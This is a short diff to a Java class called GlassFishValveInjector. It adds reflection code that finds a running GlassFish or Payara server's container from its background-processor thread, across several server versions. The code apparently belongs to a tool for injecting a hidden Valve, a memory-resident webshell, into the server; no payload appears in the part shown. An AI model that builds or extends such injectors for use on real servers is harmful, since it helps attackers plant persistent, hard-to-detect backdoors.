@@ -80,7 +80,11 @@ public class GlassFishValveInjector {
                 if (target == null) {
                     continue;
                 }
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(target, "this$0"), "children");
+                Object container = getContainerFromProcessor(target);
+                if (container == null) {
+                    continue;
+                }
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(container, "children");
                 Collection<?> values = childrenMap.values();
                 for (Object value : values) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
@@ -98,6 +102,31 @@ public class GlassFishValveInjector {
             // JDK 21+
             return getFieldValue(getFieldValue(thread, "holder"), "task");
         }
+    }
+
+    /**
+     * Older GlassFish/Payara: ContainerBackgroundProcessor.this$0
+     * Payara 6.2024+/7: ContainerBackgroundProcessorAtomic.base (WeakReference)
+     */
+    private Object getContainerFromProcessor(Object target) throws Exception {
+        try {
+            return getFieldValue(target, "this$0");
+        } catch (NoSuchFieldException ignored) {
+        }
+        try {
+            Object atomic = getFieldValue(target, "containerBackgroundProcessorAtomic");
+            Object base = getFieldValue(atomic, "base");
+            if (base instanceof java.lang.ref.Reference) {
+                return ((java.lang.ref.Reference<?>) base).get();
+            }
+            return base;
+        } catch (NoSuchFieldException ignored) {
+        }
+        Object base = getFieldValue(target, "base");
+        if (base instanceof java.lang.ref.Reference) {
+            return ((java.lang.ref.Reference<?>) base).get();
+        }
+        return base;
     }
 
     private ClassLoader getWebAppClassLoader(Object context) throws Exception {
